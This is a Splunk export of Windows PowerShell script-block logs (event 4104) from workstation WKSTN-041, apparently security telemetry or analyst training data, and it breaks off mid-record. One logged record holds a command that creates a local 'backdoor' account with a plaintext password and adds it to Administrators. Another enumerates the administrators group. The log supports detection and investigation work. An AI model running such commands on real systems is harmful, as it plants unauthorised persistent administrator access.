ComputerName,EventCode,EventType,Keywords,LogName,Message,OpCode,RecordNumber,"ScriptBlock_ID",Sid,SidType,SourceName,TaskCategory,Type,User,"_raw","_time",eventtype,host,index,linecount,punct,source,sourcetype,"splunk_server","splunk_server_group",tag,"tag::eventtype"
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: c72373e1-3ad9-4ccd-b795-77ae1f61144a
Path:","On create calls",10895,"c72373e1-3ad9-4ccd-b795-77ae1f61144a","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:41:14.080 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10895
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: c72373e1-3ad9-4ccd-b795-77ae1f61144a
Path:","2026-09-06T12:41:14.080+0530",,"WKSTN-041",winserver,19,"//_::._=--/===-==-------==--====___=__=___(__):\r\r\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
Get-LocalGroupMember -Group ""Administrators""

ScriptBlock ID: 75160626-ff91-4f92-bdb3-86b79bf53bd6
Path:","On create calls",10894,"75160626-ff91-4f92-bdb3-86b79bf53bd6","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:41:14.059 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10894
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
Get-LocalGroupMember -Group ""Administrators""

ScriptBlock ID: 75160626-ff91-4f92-bdb3-86b79bf53bd6
Path:","2026-09-06T12:41:14.059+0530",,"WKSTN-041",winserver,19,"//_::._=--/===-==-------==--====___=__=___(__):\r-_","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: 0ca0a5a6-6642-4480-bf17-44ceef002664
Path:","On create calls",10893,"0ca0a5a6-6642-4480-bf17-44ceef002664","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:41:02.532 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10893
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: 0ca0a5a6-6642-4480-bf17-44ceef002664
Path:","2026-09-06T12:41:02.532+0530",,"WKSTN-041",winserver,19,"//_::._=--/===-==-------==--====___=__=___(__):\r\r\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
New-LocalUser -Name ""backdoor"" -Password (ConvertTo-SecureString 'P@ssword123df23!DC48i' -AsPlainText -Force); Add-LocalGroupMember -Group ""Administrators"" -Member ""backdoor""

ScriptBlock ID: bd2ea480-14a8-4fec-9bb2-94cda7150d22
Path:","On create calls",10892,"bd2ea480-14a8-4fec-9bb2-94cda7150d22","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:41:02.175 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10892
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
New-LocalUser -Name ""backdoor"" -Password (ConvertTo-SecureString 'P@ssword123df23!DC48i' -AsPlainText -Force); Add-LocalGroupMember -Group ""Administrators"" -Member ""backdoor""

ScriptBlock ID: bd2ea480-14a8-4fec-9bb2-94cda7150d22
Path:","2026-09-06T12:41:02.175+0530",,"WKSTN-041",winserver,19,"//_::._=--/===-==-------==--====___=__=___(__):\r-_","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: c633a729-11cd-45e6-93c8-68dbd3447ff4
Path:","On create calls",10891,"c633a729-11cd-45e6-93c8-68dbd3447ff4","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:40:55.572 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10891
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
prompt

ScriptBlock ID: c633a729-11cd-45e6-93c8-68dbd3447ff4
Path:","2026-09-06T12:40:55.572+0530",,"WKSTN-041",winserver,19,"//_::._=--/===-==-------==--====___=__=___(__):\r\r\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 58bf5616-1b7d-4d28-815f-782b27eeb695
Path:","On create calls",10890,"58bf5616-1b7d-4d28-815f-782b27eeb695","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:40:55.250 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10890
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 58bf5616-1b7d-4d28-815f-782b27eeb695
Path:","2026-09-06T12:40:55.250+0530",,"WKSTN-041",winserver,42,"//_::._=--/===-==-------==--====___=__=___(__):\r_\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 31582b4c-cbae-470c-901f-f98d54196b4a
Path:","On create calls",10889,"31582b4c-cbae-470c-901f-f98d54196b4a","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:40:55.209 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10889
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 31582b4c-cbae-470c-901f-f98d54196b4a
Path:","2026-09-06T12:40:55.209+0530",,"WKSTN-041",winserver,42,"//_::._=--/===-==-------==--====___=__=___(__):\r_\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 8e6c6583-30aa-4ab9-b5fb-d573beaa919f
Path:","On create calls",10888,"8e6c6583-30aa-4ab9-b5fb-d573beaa919f","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:40:55.137 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10888
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 8e6c6583-30aa-4ab9-b5fb-d573beaa919f
Path:","2026-09-06T12:40:55.137+0530",,"WKSTN-041",winserver,42,"//_::._=--/===-==-------==--====___=__=___(__):\r_\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,5,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 212888f1-d18e-462b-96db-231aaa5554ed
Path:","On create calls",10887,"212888f1-d18e-462b-96db-231aaa5554ed","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Verbose,"NOT_TRANSLATED","09/06/2026 12:40:54.938 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=WKSTN-041
User=NOT_TRANSLATED
Sid=S-1-5-21-109274136-1242102717-3399047385-500
SidType=0
SourceName=Microsoft-Windows-PowerShell
Type=Verbose
RecordNumber=10887
Keywords=None
TaskCategory=Execute a Remote Command
OpCode=On create calls
Message=Creating Scriptblock text (1 of 1):
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}

ScriptBlock ID: 212888f1-d18e-462b-96db-231aaa5554ed
Path:","2026-09-06T12:40:54.938+0530",,"WKSTN-041",winserver,42,"//_::._=--/===-==-------==--====___=__=___(__):\r_\r","WinEventLog:Microsoft-Windows-PowerShell/Operational","WinEventLog:Microsoft-Windows-PowerShell/Operational","si-i-0a234205a24b7a812.prd-p-tlleq.splunkcloud.com",,,
"WKSTN-041",4104,3,None,"Microsoft-Windows-PowerShell/Operational","Creating Scriptblock text (4 of 4):
erType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DnsSecIPsecRequired')) {
          [object]$__cmdletization_value = ${DnsSecIPsecRequired}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DnsSecValidationRequired')) {
          [object]$__cmdletization_value = ${DnsSecValidationRequired}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GpoName')) {
          [object]$__cmdletization_value = ${GpoName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IPsecTrustAuthority')) {
          [object]$__cmdletization_value = ${IPsecTrustAuthority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('NameEncoding')) {
          [object]$__cmdletization_value = ${NameEncoding}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('NameServers')) {
          [object]$__cmdletization_value = ${NameServers}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Namespace')) {
          [object]$__cmdletization_value = ${Namespace}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Server')) {
          [object]$__cmdletization_value = ${Server}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PassThru')) {
          [object]$__cmdletization_value = ${PassThru}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule'
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP PS_DnsClientNRPTRule_v1.0.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-DnsClientNrptRule' -Alias '*'
        


ScriptBlock ID: 388bf91a-f847-480e-9ae7-e16bf7b1ef65
Path:","On create calls",10886,"388bf91a-f847-480e-9ae7-e16bf7b1ef65","S-1-5-21-109274136-1242102717-3399047385-500",0,"Microsoft-Windows-PowerShell","Execute a Remote Command",Warning,"NOT_TRANSLATED","09/06/2026 12:40:54.826 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=3
